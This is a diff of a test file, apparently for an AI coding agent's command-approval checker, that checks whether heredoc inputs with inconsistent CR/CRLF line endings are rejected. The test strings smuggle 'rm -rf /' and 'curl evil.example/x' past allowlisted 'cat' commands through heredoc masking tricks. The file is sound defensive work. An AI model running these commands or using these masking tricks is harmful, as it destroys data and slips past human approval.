@@ -163,20 +163,80 @@ describe("getCommandDecision — integration with dangerous substitution checks"
 		expect(getCommandDecision("cat <<-EOF\n\tEO\\\n\tF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"])).toBe("ask_user")
 	})
 
-	it("asks user for the commands after a CRLF heredoc whose backslash-CRLF pair bash joins", () => {
+	it("fails closed on a CRLF heredoc whose backslash-CRLF pair only the msys read layer joins", () => {
 		// The msys/Cygwin read layer (the reference shell on the Windows
 		// target) strips the CR from every line it reads, so the line ends
 		// with the lone backslash and continues: `EO\` + `F` joins into the
-		// terminator and the commands after it are live, not masked body text.
-		expect(getCommandDecision("cat <<EOF\r\nEO\\\r\nF\r\ntouch x\r\nEOF\r\n", ["cat"])).toBe("ask_user")
+		// terminator and the commands after it are live. POSIX bash reads
+		// `\<CR>` as an escaped CR and joins nothing, so the two models close
+		// on different lines; the join consuming a CRLF makes the boundary
+		// model-dependent and the input is rejected as malformed.
+		expect(getCommandDecision("cat <<EOF\r\nEO\\\r\nF\r\ntouch x\r\nEOF\r\n", ["cat"])).toBe("malformed_command")
 	})
 
 	it("never auto-approves the command a bare-CR heredoc terminator candidate exposes", () => {
-		// The read layer strips the bare CR, so the body line arrives as the
-		// terminator `EOF` and `curl evil` runs live after it. Even with both
-		// surrounding cats allowlisted, the exposed command must cost a
-		// prompt instead of riding the heredoc mask.
-		expect(getCommandDecision("cat <<EOF\nEO\rF\ncurl evil.example/x\nEOF\ncat ok", ["cat"])).toBe("ask_user")
+		// The msys read layer strips the bare CR, so the body line arrives as
+		// the terminator `EOF` and `curl evil` would run live after it, while
+		// POSIX bash keeps the CR and masks it. A CR inside a scanned body
+		// line makes the mask boundary model-dependent, so the whole input is
+		// rejected as malformed -- a prompt-or-reject cost, never approval.
+		expect(getCommandDecision("cat <<EOF\nEO\rF\ncurl evil.example/x\nEOF\ncat ok", ["cat"])).toBe(
+			"malformed_command",
+		)
+	})
+
+	it("never auto-approves a bare-CR early close that re-exposes a masking heredoc opener", () => {
+		// The msys model closes the first heredoc at `EO<CR>F`; the scanner
+		// would then read the body line `cat <<X` as a live opener whose body
+		// masks `rm -rf /`, an unaccountable decomposition an allowlisted
+		// `cat` must never carry to execution.
+		expect(getCommandDecision("cat <<EOF\nEO\rF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
+			"auto_approve",
+		)
+		expect(getCommandDecision("cat <<EOF\nEO\rF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).toBe(
+			"malformed_command",
+		)
+	})
+
+	it("never auto-approves a CRLF-joined late close that masks a POSIX-executed command", () => {
+		// The msys join of `x\` + CRLF keeps the heredoc open past the line
+		// where POSIX bash (delimiter word `EOF<CR>`) ends it and executes the
+		// masked line, so the two models diverge; the input must cost a
+		// rejection instead of auto-approving one masked `cat` command.
+		expect(getCommandDecision("cat <<EOF\r\nx\\\r\nEOF\r\nrm -rf /\r\nEOF\r\n", ["cat"], [])).not.toBe(
+			"auto_approve",
+		)
+		expect(getCommandDecision("cat <<EOF\r\nx\\\r\nEOF\r\nrm -rf /\r\nEOF\r\n", ["cat"], [])).toBe(
+			"malformed_command",
+		)
+	})
+
+	it("never auto-approves a CR-free body whose CRLF opener line splits the delimiter word", () => {
+		// The opener line's CRLF leaves msys reading the delimiter `EOF` while
+		// POSIX bash reads `EOF<CR>`, so the CR-free `EOF` line closes the
+		// heredoc for msys only and the following `cat <<X` opener masks
+		// `rm -rf /` under that model -- an allowlisted `cat` must never carry
+		// that decomposition to execution.
+		expect(getCommandDecision("cat <<EOF\r\nbody\nEOF\ncat <<X\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
+			"auto_approve",
+		)
+		expect(getCommandDecision("cat <<EOF\r\nbody\nEOF\ncat <<X\nrm -rf /\nX\n", ["cat"], [])).toBe(
+			"malformed_command",
+		)
+	})
+
+	it("never auto-approves the masking heredoc exposed by a CRLF-terminated terminator line", () => {
+		// With an LF opener both models read the delimiter `EOF`, but the CR on
+		// the terminator candidate is ordinary content for POSIX bash and is
+		// stripped by the msys read layer, which closes there and re-exposes
+		// `cat <<X` as a live opener masking `rm -rf /`; the divergence must
+		// cost a rejection, never an approval.
+		expect(getCommandDecision("cat <<EOF\nEOF\r\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
+			"auto_approve",
+		)
+		expect(getCommandDecision("cat <<EOF\nEOF\r\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).toBe(
+			"malformed_command",
+		)
 	})
 
 	it("asks user for the inner commands of process substitutions", () => {
@@ -265,8 +325,14 @@ describe("getCommandDecision — integration with dangerous substitution checks"
 	})
 
 	it("does not auto-approve the CRLF variant of a comment-hidden frame tail", () => {
+		// msys strips every CR while POSIX keeps it, so the CRs here leave the
+		// two read layers on different bytes and the close cannot be verified
+		// model-independent; the parser fails the heredoc closed even though
+		// this uniformly-CRLF input's models happen to agree. The decision is
+		// a rejection rather than the LF variant's prompt; never an approval
+		// either way.
 		expect(getCommandDecision("cat <<EOF\r\n$( echo ok # )\r\ncurl evil)\r\nEOF\r\n", ["cat", "echo"])).toBe(
-			"ask_user",
+			"malformed_command",
 		)
 	})
 
